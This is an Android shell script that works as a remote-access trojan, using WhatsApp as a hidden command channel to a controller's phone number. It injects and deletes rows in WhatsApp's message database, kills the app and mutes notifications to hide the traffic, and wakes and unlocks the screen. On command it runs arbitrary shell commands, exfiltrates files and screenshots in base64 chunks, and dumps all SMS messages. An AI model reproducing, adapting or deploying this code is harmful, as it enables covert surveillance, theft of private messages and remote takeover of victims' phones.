number='{cc}{phone number}'  # Servers phone number used as sample (throwaway number) i.e. 14161231234
#su

## Statements checks display resolution to determine position of buttons (Not needed anymore)
if wm size | grep -Fq "Physical size: 768x1280"; then
   send_btn=(720 1125)
   tele_send_btn=(650 750)
elif wm size | grep -Fq "Physical size: 1440x2560"; then
   send_btn=(1325 2270)
elif wm size | grep -Fq "Physical size: 1080x1920"; then
   send_btn=(1000 1848)
else
   exit
fi

# Function converts hexadecimal to string
hex2string() 
{
  I=0
  while [ $I -lt ${#1} ];
  do
    echo -en "\x"${1:$I:2}
    let "I += 2"
  done
}

# Function executes shell commands and returns stdout
shell()
{
  #$1
  #echo $*
  stdout=$($* 2>&1)
  echo "$stdout"
}

# Function handles communication through WhatsApp
WhatsApp()
{
db="sqlite3 /data/data/com.whatsapp/databases/msgstore.db"   # Database location for whatsapp messages 
PacketsIn=0                                                  # Counter variable to track incoming file packets
PacketsExpected=0                                            # Establishes how many segmented file packets should be received
PacketArray=()                                               # Array is to keep received packets sorted in the received order
fname=''                                                     # Holds file name of file being received
   
   # kill the whatsapp process so messages dont show on GUI
   kill_pid()
   {
      if ps | grep -Fqi whatsapp; then
         pid=$(ps | grep -i whatsapp | awk -F ' ' '{print $2}')
         kill $pid
      fi   
   }
   # Deletes message from database
   delete()
   {
      if [ $# -eq 0 ]; then
         $db "pragma busy_timeout=2000; delete from chat_list where key_remote_jid='$number@s.whatsapp.net'"
         $db "pragma busy_timeout=2000; delete from messages where key_remote_jid='$number@s.whatsapp.net'"
         $db "pragma busy_timeout=2000; delete from frequents where jid='$number@s.whatsapp.net';"
         #kill_pid
      else
         $db "pragma busy_timeout=2000; delete from chat_list where key_remote_jid='$number@s.whatsapp.net'"
         $db "pragma busy_timeout=2000; delete from messages where _id=$1"
         $db "pragma busy_timeout=2000; delete from frequents where jid='$number@s.whatsapp.net';"
         #kill_pid
      fi         
   }
   
   # Inserts message into DB to be sent
   insert_message()
   {
      msg=$1
      dat=$(echo ${EPOCHREALTIME:0:14} | sed 's/\.//g')
      sleep 0.04
      dat2=$(echo ${EPOCHREALTIME:0:14} | sed 's/\.//g')
      key_id=$(echo $dat $msg $number | md5sum | awk '{print $1}' | tr 'a-z' 'A-Z')
      $db "pragma busy_timeout=2000; INSERT INTO \"messages\" (key_remote_jid, key_from_me, key_id, status, needs_push, data, timestamp, media_url, media_mime_type, media_wa_type, media_size, media_name, media_caption, media_hash, media_duration, origin, latitude, longitude, thumb_image, remote_resource, received_timestamp, send_timestamp, receipt_server_timestamp, receipt_device_timestamp, read_device_timestamp, played_device_timestamp, raw_data, recipient_count, participant_hash, starred, quoted_row_id, mentioned_jids, multicast_id, edit_version, media_enc_hash, payment_transaction_id, forwarded, preview_type, send_count) VALUES('$number@s.whatsapp.net',1,'$key_id',0,0,'$msg',$dat,NULL,NULL,0,0,NULL,NULL,NULL,0,0,0.0,0.0,NULL,NULL,$dat2,-1,-1,-1,NULL,NULL,NULL,0,NULL,NULL,0,NULL,NULL,0,NULL,NULL,0,0,NULL);"
   }
   
   # Restarts App to ensure message is sent via offline mode after being inserted into DB
   send()
   { 
      kill_pid
      sleep 2
      
      if dumpsys window | grep -Fq 'mAwake=false'; then
         input keyevent KEYCODE_WAKEUP
      fi
      if dumpsys window | grep -Fq 'mShowingLockscreen=true'; then
         input touchscreen swipe 720 1000 720 100 1100
      fi
      
      # Alternative options to send messages by starting and stopping wifi
      #if ps | grep -Fqi whatsapp; then
      #   su -c 'svc wifi disable'
      #   sleep 2
      #   su -c 'svc wifi enable'
      #else
      #   am start -W -n com.whatsapp/.HomeActivity
      #   kill_pid
      #fi 
  
      am start -W -n com.whatsapp/.HomeActivity
      sleep 1

      delete
   }
   
   # Receives command to send file, then processes file fragments in base64
   get_file() 
   {
     
      if [[ "$2" == 0 ]]; then
         PacketsIn=0
         PacketsExpected=`expr $(($3+0))`
         fname=$4
         dir=$5
         PacketArray=()
      elif [[ "$2" == -1 ]]; then
         echo "-1"
      else        
         PacketsIn=$(( $PacketsIn + 1 ))
         PacketArray[$(($2+0))]=$3
         if [[ "$PacketsIn" = "$PacketsExpected" ]]; then
            b64_file=""
            for i in "${!PacketArray[@]}"; do
               b64_file+=$(echo -n "${PacketArray[$i]}")
            done
            echo -n $b64_file | base64 -d >> $dir$fname
         fi   
      fi
   }  
 
   # Sends file in base64 fragments to server
   send_file()
   {
      f=$(cat $2 | base64 | tr -d '\n')
      CharCount=$(echo -n $f | wc -c)
      if test CharCount -gt 65526; then
         fileArray=()
         pktCount=0
         packets=$(awk 'function ceiling(x){return x%1 ? int(x)+1 : x} BEGIN{ print ceiling('$CharCount'/65526) }') # divides packet by character limit of whatsapp messages to determine how many segments must be sent
         insert_message "file 0 $packets"
         send
         while [ pktCount -lt $packets ]; do # puts base64 encoded image into segment array in order to be sent
            fileArray[$pktCount]=$(echo ${f:0:65526})
            f=$(echo $f | cut -c 65527-)  
            pktCount=$(( $pktCount + 1 ))
         done
         for i in "${!fileArray[@]}"; do
            index=$(($i + 1))
            insert_message "file $index ${fileArray[$i]}"
         done
         send
      else
         insert_message "file -1 $f"
         send
      fi
   }
 
   # Takes screenshot and inserts screen.ong segments into database and sends
   screenshot()
   {
      screencap -p > /data/local/tmp/screen.png
      screen=$(cat /data/local/tmp/screen.png | base64 | tr -d '\n')
      CharCount=$(echo -n $screen | wc -c)
      if test CharCount -gt 65526; then
         screenArray=()
         pktCount=0
         packets=$(awk 'function ceiling(x){return x%1 ? int(x)+1 : x} BEGIN{ print ceiling('$CharCount'/65526) }')  # divides packet by character limit of whatsapp messages to determine how many segments must be sent
         insert_message "screen 0 $packets"   # sends command to tell server how many packets to expect
         send
         while [ pktCount -lt $packets ]; do # puts base64 encoded image into segment array in order to be sent
            screenArray[$pktCount]=$(echo ${screen:0:65526})
            screen=$(echo $screen | cut -c 65527-)  
            pktCount=$(( $pktCount + 1 ))
         done
         for i in "${!screenArray[@]}"; do # sends base64 encoded screen segments 
            index=$(($i + 1))
            insert_message "screen $index ${screenArray[$i]}"
         done
         send
      else         
         insert_message "screen -1 $screen" # Sends only one packet for images file with size below max character limit
         send
      fi
   }

# Determines if screen is locked, wakes and and swipes up if no password is set
if dumpsys window | grep -Fq 'mAwake=false'; then
   input keyevent KEYCODE_WAKEUP
fi
if dumpsys window | grep -Fq 'mShowingLockscreen=true'; then
   input touchscreen swipe 720 1000 720 100 1100
fi

# Sends a SYN packets to lets the server know it is listening
insert_message 'SYN'
send

# Listens for an ACK from the server and confirms the connection by sending the current working directory
while [ 1 -eq 1 ]; do
   if dumpsys notification | grep -i whatsapp | egrep StatusBarNotification | awk '{print $4}' | cut -d "=" -f 2 | grep -Fq "$number@s.whatsapp.net"; then
      if $db "pragma busy_timeout=2000; select data from messages where key_remote_jid='$number@s.whatsapp.net'" | grep -Fq "ACK"; then
         SlaveConnected=1
         service call notification 1
         delete
         sleep 2
         `sqlite3 /data/data/com.whatsapp/databases/chatsettings.db "pragma busy_timeout=2000; INSERT INTO \"settings\" (jid,deleted,mute_end,muted_notifications,use_custom_notifications,message_tone,message_vibrate,message_popup,message_light,call_tone,call_vibrate,status_muted,pinned,pinned_time,low_pri_notifications,media_visibility) VALUES('$number@s.whatsapp.net',NULL,1572428335561,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);"`
         wd=$(pwd)
         insert_message "wd $wd"
         send
         sleep 2
         delete
         break
      fi
   fi
done
 
# Receives different commands from server and processes them  
CommandArray=()  # creates a queue for received commands
if test $SlaveConnected -eq 1; then
   while [ 1 -eq 1 ]; do
      if test $($db "pragma busy_timeout=2000; select count(*) from messages where key_remote_jid='$number@s.whatsapp.net'") -gt 0; then
         while [ 1 -eq 1 ]; do
            cmd=$($db "pragma busy_timeout=2000; select _id, data from messages where key_remote_jid='$number@s.whatsapp.net' and data is not null order by _id desc limit 1")
            #delete
            id=`expr $(($(echo $cmd | cut -d"|" -f1)-0))`          
            sleep 2
            if [[ $id = 0 ]]; then
               break
            fi
            # Puts command in array by sorts by database ID column
            cmd=$(echo $cmd | cut -d"|" -f2-)
            CommandArray[$id]="$cmd" 
            delete $id
         done

         if [ ${#CommandArray[@]} -eq 0 ]; then
            continue
         fi

         for i in "${!CommandArray[@]}"; do
            cmd="${CommandArray[$i]}"
         
            if [[ "$cmd" == pull* ]]; then
               send_file $cmd
            elif [[ "$cmd" == push* ]]; then
               get_file $cmd  # Should be smoother when using Java
            elif [[ "$cmd" == shell* ]]; then
               cmd=$(echo $cmd | cut -d" " -f2-)
               stdout=$(shell $cmd)
               insert_message "$stdout"
               send
            elif [[ "$cmd" == screenshot ]]; then
               screenshot
            elif [[ "$cmd" == getuid ]]; then
               stdout=$(shell "id")
               insert_message "$stdout"
               send              
            elif [[ "$cmd" == "ifconfig" ]]; then
               stdout=$(shell "ipaddr")
               insert_message "$stdout"
               send              
            elif [[ "$cmd" == "pwd" ]]; then
               stdout=$(shell "pwd")
               insert_message "$stdout"
               send               
            elif [[ "$cmd" == "ps" ]]; then
               stdout=$(shell "ps")
               insert_message "$stdout"
               send               
            elif [[ "$cmd" == sysinfo ]]; then
               v=$(shell "getprop ro.build.version.release")
               manuf=$(shell "getprop ro.product.manufacturer")
               phone=$(shell "getprop ro.product.model")
               sysinfo=$(echo -n "Phone    : $manuf $phone\nOS       : Android $v")
               insert_message "$sysinfo"
               send
            elif [[ "$cmd" == geolocate ]]; then
               echo "TODO" #TODO
            elif [[ "$cmd" == sms_dump ]]; then
               stdout=$(sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db "select address,body from sms;")
               msg=$(echo "$stdout" | sed 's/|/-/g')
               insert_message "$msg"
               send
            else
               insert_message "Unknown Command: $cmd"
               send
            fi
            unset CommandArray[$i] # Delete command from array             
         done         
      fi
   done         
else
   exit
fi
}


# Currently only prioritizes and calls whatsapp function if the package exists on the device.
if pm list packages -f | grep -Fq -i whatsapp; then
   WhatsApp
fi


